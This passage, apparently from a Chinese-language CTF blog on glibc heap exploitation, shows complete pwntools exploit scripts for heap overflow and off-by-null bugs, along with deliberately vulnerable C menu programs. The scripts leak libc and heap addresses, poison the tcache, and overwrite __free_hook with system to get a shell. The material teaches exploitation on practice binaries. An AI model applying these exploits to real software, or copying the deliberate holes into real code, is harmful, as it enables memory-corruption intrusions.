class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;heap_overflow&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x4a8</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>)<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>edit(<span class="hljs-number">2</span>,payload)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>)<br>libc_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=libc_d-<span class="hljs-number">0x470</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x4b1</span>))<br><br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_2=calc_fd(heap_d,<span class="hljs-number">0x290</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x10</span>)-<span class="hljs-number">0x10</span><br>heap_1=heap_2-<span class="hljs-number">0x60</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(<span class="hljs-number">0x61</span>)+p64(en_fd(heap_1+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">2</span>,p64(system))<br>free(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="off-by-null">off by null</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    构造payload，将相邻的后一个chunk的inuse位设置为0</span><br><span class="hljs-comment">    并构造当前chunk为一个位于双向链表中的chunk，使两个chunk合并</span><br><span class="hljs-comment">    然后当前chunk就变成了</span><br><span class="hljs-comment">    prev_size       size</span><br><span class="hljs-comment">    fake_prev_size  fake_size</span><br><span class="hljs-comment">    unsorted_bin    unsorted bin</span><br><span class="hljs-comment">    ........</span><br><span class="hljs-comment">    prev_size       size</span><br><span class="hljs-comment">    在这种情况下，如果有edit的功能，则可以修改内存中bin的结构</span><br><span class="hljs-comment">    在低版本中可以利用fast bin，高版本中可以利用tcache bin</span><br><span class="hljs-comment">    这种方法的条件就是需要有一个可控的，已知的空间地址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc obn.c -o obn</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    chunk_list[ind]=<span class="hljs-number">0</span>;<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    buf[read(<span class="hljs-number">0</span>,buf,size_list[ind])]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;     <br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="off-by-null-示例分析">off by null 示例分析</h3>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p>
+<p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;exp 思路</span><br><span class="hljs-string">    先获取chunk地址，然后构造chunk内容</span><br><span class="hljs-string">    并利用edit函数中的off by null 将下一个chunk的inuse位设置为0</span><br><span class="hljs-string">    这时将下一个chunk释放就会导致下一个chunk与当前chunk合并</span><br><span class="hljs-string">    然后放入unsorted bin中</span><br><span class="hljs-string">    这里面需要绕过unlink的检测，所以需要一个可控的空间地址</span><br><span class="hljs-string">    使 chunk-&gt;fd-&gt;bk=chunk  chunk-&gt;bk-&gt;fd=chunk</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        在已知chunk相对于heap段的偏移时，</span><br><span class="hljs-string">        可以获取heap段地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;obn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x438</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x4f8</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>show(<span class="hljs-number">1</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap3=calc_fd(heap_d,<span class="hljs-number">0xc40</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap3))<br>heap2=heap3-<span class="hljs-number">0x500</span><br>heap1=heap2-<span class="hljs-number">0x60</span><br>tcache_bin=heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x10</span><br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br>payload=p64(heap1)*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">3</span>,payload)<br>payload=p64(heap3)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>show(<span class="hljs-number">1</span>)<br>list_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=list_d-<span class="hljs-number">0x4a0</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">1</span>,p64(en_fd(heap1+<span class="hljs-number">0x10</span>,free_hook)))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">6</span>,p64(system))<br>free(<span class="hljs-number">5</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="off-by-one">off by one</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    构造payload，将后一个chunk的size设置为足够包含与其相邻的后一个chunk</span><br><span class="hljs-comment">    构造size 足够放入unsorted bin</span><br><span class="hljs-comment">    通过调用malloc时使其分裂，还原heap</span><br><span class="hljs-comment">    这时在与其相邻的后一个chunk，会出现在程序的chunk列表中，也会出现在bin中</span><br><span class="hljs-comment">    这样就可以修改bin的结构</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc obo.c -o obo</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span 